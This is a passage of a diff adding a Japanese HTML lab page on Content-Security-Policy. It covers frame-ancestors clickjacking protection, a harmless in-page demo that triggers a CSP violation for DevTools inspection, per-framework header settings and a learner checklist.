+        <td><code>DENY</code> / <code>SAMEORIGIN</code></td>
+        <td><code>frame-ancestors 'none'</code> / <code>'self'</code> / URLリスト</td>
+      </tr>
+      <tr>
+        <td><strong>細粒度制御</strong></td>
+        <td><span class="tag-ng">❌ 低い</span>（2種類のみ）</td>
+        <td><span class="tag-ok">✅ 高い</span>（URLごとに許可可能）</td>
+      </tr>
+      <tr>
+        <td><strong>複数オリジン許可</strong></td>
+        <td><span class="tag-ng">❌ 不可</span></td>
+        <td><span class="tag-ok">✅ 可能</span>（スペース区切りで複数指定）</td>
+      </tr>
+      <tr>
+        <td><strong>推奨度</strong></td>
+        <td><span class="tag-warn">⚠ レガシー</span></td>
+        <td><span class="tag-ok">✅ 現在の標準</span></td>
+      </tr>
+      <tr>
+        <td><strong>metaタグで有効</strong></td>
+        <td>N/A（ヘッダーのみ）</td>
+        <td><span class="tag-ng">❌ ヘッダーのみ有効</span></td>
+      </tr>
+      <tr>
+        <td><strong>ブラウザサポート</strong></td>
+        <td>全ブラウザ</td>
+        <td>全モダンブラウザ</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="step">
+    <div class="step-num">STEP 1 — frame-ancestors の設定例</div>
+    <pre><span class="comment">// すべての iframe 埋め込みを禁止（最も厳格）</span>
+<span class="header-name">Content-Security-Policy:</span> <span class="header-val">frame-ancestors 'none'</span>
+
+<span class="comment">// 同一オリジンのみ許可（自サイト内のiframeは可）</span>
+<span class="header-name">Content-Security-Policy:</span> <span class="header-val">frame-ancestors 'self'</span>
+
+<span class="comment">// 特定のパートナーサイトのみ許可</span>
+<span class="header-name">Content-Security-Policy:</span>
+  <span class="header-val">frame-ancestors 'self' https://partner.example.com</span>
+
+<span class="comment">// レガシーな X-Frame-Options も併用（古いブラウザ対応）</span>
+<span class="header-name">X-Frame-Options:</span> <span class="header-val">DENY</span>
+<span class="header-name">Content-Security-Policy:</span> <span class="header-val">frame-ancestors 'none'</span></pre>
+  </div>
+
+  <div class="note">
+    <strong>このページも frame-ancestors 'none' が設定済み</strong>:
+    このページのCSP metaタグには <code>frame-ancestors 'none'</code> が含まれています。
+    ただし、<strong>metaタグでは frame-ancestors は有効になりません</strong>（仕様上の制限）。
+    本番環境では必ずHTTPレスポンスヘッダーで設定してください。
+    OutSystems では <code>SetResponseHeader("Content-Security-Policy", "frame-ancestors 'none'")</code> で設定できます。
+  </div>
+</div>
+
+<!-- ── 実験 8-E ── -->
+<div class="lab-box" id="exp-8e">
+  <h3>実験 8-E: DevToolsでCSP違反を確認</h3>
+  <p>
+    CSPが実際にスクリプトをブロックするとき、DevToolsのConsoleタブにエラーが表示されます。
+    意図的に違反を発生させて、エラーメッセージを確認してみましょう。
+  </p>
+
+  <div class="step">
+    <div class="step-num">STEP 1 — DevTools を開く</div>
+    <p>
+      <kbd style="background:var(--surface2);padding:0.2rem 0.5rem;border-radius:4px;">F12</kbd>
+      を押してDevToolsを開き、<strong>Console タブ</strong>に切り替えてください。
+    </p>
+    <div class="diagram">Console タブで確認できるCSP違反エラーのサンプル:
+
+  Refused to execute inline script because it violates the
+  following Content Security Policy directive:
+  "script-src 'nonce-lab08demo' 'strict-dynamic'".
+  Either the 'unsafe-inline' keyword, a hash
+  ('sha256-...'), or a nonce ('nonce-...') is required
+  to enable inline execution.
+
+  → 「Refused to execute」または「Refused to load」で始まるメッセージが
+    CSP違反のサイン</div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 2 — CSP違反を意図的に発生させる</div>
+    <p>
+      ボタンを押すと、<strong>nonce なし</strong>の動的スクリプトを追加しようとします。
+      このページのCSP（<code>script-src 'nonce-lab08demo' 'strict-dynamic'</code>）により
+      ブロックされ、Consoleにエラーが表示されるはずです。
+    </p>
+    <button class="btn btn-warn" id="btn-trigger-violation">CSP違反を意図的に発生させる（確認用）</button>
+    <pre id="violation-result"><span class="placeholder">← ボタンを押すとCSP違反が発生します（Consoleを確認）</span></pre>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 3 — Consoleエラーの読み方</div>
+    <pre><span class="comment">// CSP違反が発生すると Console に赤いエラーが表示される:</span>
+
+<span class="highlight">Refused to execute inline script</span> because it violates
+the following Content Security Policy directive:
+"<span class="header-val">script-src 'nonce-lab08demo' 'strict-dynamic'</span>"
+
+<span class="comment">// エラーメッセージの構造:</span>
+<span class="header-name">Refused to [動詞]</span>   → execute / load / connect / display など
+<span class="header-name">[リソース種別]</span>      → inline script / from 'URL' / inline style など
+<span class="header-name">[違反ディレクティブ]</span> → script-src / style-src / connect-src など
+<span class="header-name">[現在のポリシー]</span>    → 適用されているCSP値
+
+<span class="comment">// DevTools → Network タブ: ブロックされたリクエストは</span>
+<span class="comment">// Status 列に「(blocked:csp)」と表示される</span></pre>
+  </div>
+
+  <div class="note">
+    <strong>注意: 'strict-dynamic' の挙動について</strong>
+    このページのCSPには <code>'strict-dynamic'</code> が含まれています。
+    <code>'strict-dynamic'</code> は、<strong>nonce付きスクリプトが動的に追加するスクリプト</strong>を許可します。
+    しかし、<code>btn-trigger-violation</code> のクリックハンドラーは nonce付きスクリプト内にあるため、
+    <code>'strict-dynamic'</code> により動的scriptタグが許可される場合があります。
+    ブラウザの実装やCSPレベルによって挙動が異なるため、Consoleのエラー内容を実際に確認してください。
+  </div>
+</div>
+
+<script nonce="lab08demo">
+document.getElementById('btn-trigger-violation').addEventListener('click', function() {
+  var el = document.getElementById('violation-result');
+  el.textContent = '動的スクリプト追加を試みています...\n\n';
+  el.textContent += 'Console タブを確認してください！\n\n';
+
+  // nonceなしの動的scriptタグを追加（CSPにブロックされるはず）
+  try {
+    var s = document.createElement('script');
+    s.textContent = 'console.log("blocked by CSP - this should not appear")';
+    document.body.appendChild(s);
+    el.textContent += '結果: スクリプト要素を追加しました。\n\n';
+    el.textContent += 'Console を確認してください:\n';
+    el.textContent += '  - CSPエラーが表示された場合 → ブロック成功 ✅\n';
+    el.textContent += '  - エラーが表示されない場合 → このブラウザでは\n';
+    el.textContent += "    'strict-dynamic' により動的スクリプトが許可された\n\n";
+    el.textContent += "※ 'strict-dynamic' は nonce付きスクリプトから\n";
+    el.textContent += '  動的に追加されるスクリプトを許可します。\n';
+    el.textContent += '  この挙動はブラウザ実装によって異なります。\n\n';
+    el.textContent += 'CSP違反の完全な確認方法:\n';
+    el.textContent += '  DevTools → Sources タブ → スニペットで\n';
+    el.textContent += '  nonce なしのスクリプトを直接実行すると確実に確認できます';
+  } catch(e) {
+    el.textContent += 'エラー発生: ' + e.message;
+  }
+
+  // Console にも情報を出力
+  console.group('[Lab 08-E] CSP違反テスト');
+  console.log('nonceなしの動的スクリプト追加を試みました');
+  console.log('CSPポリシー: script-src \'nonce-lab08demo\' \'strict-dynamic\'');
+  console.log('strict-dynamic の有無でブロック挙動が変わります');
+  console.groupEnd();
+});
+</script>
+
+<hr>
+<h2 id="framework">🔧 フレームワーク別設定例</h2>
+<p style="font-size:0.85rem;color:var(--text-dim);">このLabで学んだヘッダーを各環境で設定する方法です。</p>
+
+<div style="overflow-x:auto;">
+<table style="width:100%;border-collapse:collapse;font-size:0.78rem;font-family:'IBM Plex Mono',monospace;margin:1rem 0;">
+  <thead>
+    <tr style="background:var(--surface2);color:var(--accent2);">
+      <th style="padding:0.6rem;border:1px solid var(--border);text-align:left;min-width:120px;">環境</th>
+      <th style="padding:0.6rem;border:1px solid var(--border);text-align:left;">設定方法</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="padding:0.6rem;border:1px solid var(--border);color:var(--accent);white-space:nowrap;">Express</td>
+      <td style="padding:0.6rem;border:1px solid var(--border);"><code>const helmet = require('helmet'); app.use(helmet.contentSecurityPolicy({ directives: { defaultSrc: ["'self'"], scriptSrc: ["'nonce-xxx'"] } }))</code></td>
+    </tr>
+    <tr>
+      <td style="padding:0.6rem;border:1px solid var(--border);color:var(--accent);white-space:nowrap;">Next.js</td>
+      <td style="padding:0.6rem;border:1px solid var(--border);"><code>// next.config.js の headers() または middleware.ts で CSP ヘッダーを返す</code></td>
+    </tr>
+    <tr>
+      <td style="padding:0.6rem;border:1px solid var(--border);color:var(--accent);white-space:nowrap;">Nginx</td>
+      <td style="padding:0.6rem;border:1px solid var(--border);"><code>add_header Content-Security-Policy "default-src 'self'; script-src 'nonce-xxx'";</code></td>
+    </tr>
+    <tr>
+      <td style="padding:0.6rem;border:1px solid var(--border);color:var(--accent);white-space:nowrap;">OutSystems</td>
+      <td style="padding:0.6rem;border:1px solid var(--border);"><code>SetResponseHeader("Content-Security-Policy", "default-src 'self'")</code></td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<div class="note" style="border-color:var(--accent3);background:#f3e8fd;">
+  🔗 <strong style="color:var(--accent3);">多層防御クロスリファレンス</strong>：CSP（このLab）+ <a href="http-header-lab-05.html">Lab 05 の HttpOnly Cookie</a> + <a href="http-header-lab-09.html">Lab 09 の X-Content-Type-Options</a> = XSS に対する多層防御。1つが突破されても他の層が攻撃を阻止します。
+</div>
+
+<hr>
+<h2 id="checklist">✅ Lab 08 チェックリスト</h2>
+<p style="font-size:0.82rem; color:var(--text-dim);">チェック状態はブラウザに自動保存されます。</p>
+
+<div class="check-item"><input type="checkbox" data-key="lab08-1"> <label>CSP基本ディレクティブ（default-src, script-src, img-src）の役割を理解した</label></div>
+<div class="check-item"><input type="checkbox" data-key="lab08-2"> <label>このページのCSP設定をmetaタグで確認した</label></div>
+<div class="check-item"><input type="checkbox" data-key="lab08-3"> <label><code>'unsafe-inline'</code> が危険な理由と nonce方式との違いを説明できる</label></div>
+<div class="check-item"><input type="checkbox" data-key="lab08-4"> <label><code>'strict-dynamic'</code> の役割（動的スクリプトを許可）を理解した</label></div>
+<div class="check-item"><input type="checkbox" data-key="lab08-5"> <label><code>Content-Security-Policy-Report-Only</code> の用途（本番前テスト）を理解した</label></div>
+<div class="check-item"><input type="checkbox" data-key="lab08-6"> <label><code>frame-ancestors</code> でクリックジャッキングを防止できることを理解した</label></div>
+<div class="check-item"><input type="checkbox" data-key="lab08-7"> <label>DevTools Console でCSP違反ログを確認した</label></div>
+
+<div style="margin-top:1rem; text-align:center;">
+  <span id="progress-text" style="font-family:'IBM Plex Mono',monospace; color:var(--accent); font-size:0.9rem;"></span>
+</div>
+
+<script nonce="lab08demo">
+  var STORAGE_PREFIX = 'httplab_';
+  function updateProgress() {
+    var all = document.querySelectorAll('input[type="checkbox"][data-key]');
+    var checked = Array.prototype.filter.call(all, function(cb) { return cb.checked; }).length;
+    var el = document.getElementById('progress-text');
+    if (el) el.textContent = checked + ' / ' + all.length + ' 完了';
+  }
+  document.querySelectorAll('input[type="checkbox"][data-key]').forEach(function(cb) {
+    var saved = localStorage.getItem(STORAGE_PREFIX + cb.dataset.key);
+    if (saved === 'true') {
+      cb.checked = true;
+      var item = cb.closest('.check-item');
+      if (item) item.classList.add('checked');
+    }
+    cb.addEventListener('change', function() {
+      localStorage.setItem(STORAGE_PREFIX + cb.dataset.key, cb.checked);
+      var item = cb.closest('.check-item');
+      if (item) item.classList.toggle('checked', cb.checked);
+      updateProgress();
+    });
+  });
+  updateProgress();
+</script>
+
+<hr>
+
+<div class="lab-box" style="border-color:var(--warn);">
+  <h3 style="color:var(--warn);margin-top:0;">🚀 本番環境で確認すべきこと</h3>
+  <p style="font-size:0.82rem;color:var(--text-dim);">このLabの内容をデプロイ前に確認するチェックリストです。</p>
+  <div style="padding:0.3rem 0;font-size:0.85rem;">☐ <code>Content-Security-Policy</code> が <code>'unsafe-inline'</code> を含んでいない</div>
+  <div style="padding:0.3rem 0;font-size:0.85rem;">☐ <code>script-src</code> に <code>nonce</code> + <code>'strict-dynamic'</code> を使用している</div>
+  <div style="padding:0.3rem 0;font-size:0.85rem;">☐ <code>frame-ancestors 'none'</code> または適切な値を設定している（クリックジャッキング防止）</div>
+  <div style="padding:0.3rem 0;font-size:0.85rem;">☐ 本番適用前に <code>Content-Security-Policy-Report-Only</code> でテスト済み</div>
+  <div style="padding:0.3rem 0;font-size:0.85rem;">☐ <code>Reporting-Endpoints</code> でCSP違反レポートの送信先を設定している</div>
+</div>
+
+<div class="note">
+  📖 <strong>参照資料</strong>：このLabの内容は <code>http-headers-guide-v2.md</code> の 第2部①「オリジンWebサーバー」の CSP 部分 に対応しています。より詳しい解説・ヘッダー一覧はガイドを参照してください。
+</div>
+
+<h2>📝 Lab 08 学習ノート</h2>
+<p style="font-size:0.82rem; color:var(--text-dim);">メモはブラウザに自動保存されます。</p>
+<textarea id="notes" rows="6" placeholder="気づいたこと、疑問点をメモ..."
+  style="width:100%;background:var(--surface);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);padding:0.8rem;font-family:'Noto Sans JP',sans-serif;font-size:0.9rem;resize:vertical;margin-top:0.5rem;"></textarea>
+
+<script nonce="lab08demo">
+  var notesEl = document.getElementById('notes');
+  var savedNotes = localStorage.getItem(STORAGE_PREFIX + 'lab08_notes');
+  if (savedNotes) notesEl.value = savedNotes;
+  notesEl.addEventListener('input', function() {
+    localStorage.setItem(STORAGE_PREFIX + 'lab08_notes', notesEl.value);
+  });
+</script>
+
+<div style="margin-top:2rem; display:flex; justify-content:space-between; font-size:0.82rem; color:var(--text-dim);">
+  <span>← 前回: <a href="http-header-lab-07.html"><strong>Lab 07 — CORS応用</strong></a></span>
+  <span>次回: <a href="http-header-lab-09.html"><strong>Lab 09 — セキュリティヘッダー（HSTS, X-Content-Type-Options, Referrer-Policy, Permissions-Policy）</strong></a> →<br><span style="color:var(--text-dim);font-size:0.78rem;">CSPに加えて、HSTS / Referrer-Policy / Permissions-Policy で多層防御を完成させます</span></span>
+</div>
+
+</body>
+</html>
